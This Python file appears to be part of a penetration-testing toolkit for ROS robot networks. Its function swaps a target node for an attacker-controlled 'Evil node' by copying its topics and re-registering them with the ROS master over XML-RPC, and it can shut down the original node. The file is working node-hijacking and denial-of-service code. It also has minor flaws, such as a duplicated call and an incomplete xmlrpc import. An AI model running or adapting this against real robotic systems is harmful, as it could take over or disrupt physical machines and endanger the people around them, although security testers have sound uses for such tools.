import copy
import xmlrpc

from core.node import Node


def replace_node(target_node: Node, node_name: str, new_ip: str = "", new_port: str = "0", alert_master=False,
                 kill_original=False):
    """
    Replace a node with an attacker controlled Node. Can optionally kill the original
    :param target_node: Node to replace
    :param node_name: The name to give for ros exploits
    :param new_ip: IP address for the node to use if blank the node will be created on local host
    :param new_port: Port for the node to use. If 0 the node will open a port first
    :param alert_master: Boolean value. If true replace the node in the masters graph, if false updates to the state
    do not reach the new node
    :return:
    """
    new_node = Node(ip_addr=new_ip, port=new_port, notes="Evil node")
    node_uri = "http://" + new_ip + ":" + new_port
    target_node.get_pub_list(node_name=node_name)
    target_node.get_pub_list(node_name=node_name)

    # TODO: Let the other nodes know about the replacemnet
    for topic in target_node.pub_topics:
        new_node.pub_topics.append(copy.copy(topic))
    for topic in target_node.sub_topics:
        new_node.sub_topics.append(copy.copy(topic))

    if alert_master:
        (_, _, master_url) = target_node.server.getMasterUri(node_name)
        master = xmlrpc.client.ServerProxy(master_url)
        for topic in new_node.pub_topics:
            master.registerPublisher(node_name, topic.name, topic.message_type, node_uri)
        # TODO: Create connections to subscriber
        for topic in new_node.sub_topics:
            master.registerSubscriber(node_name, topic.name, topic.message_type, node_uri)

    if kill_original:
        target_node.server.shutdown(node_name, "")
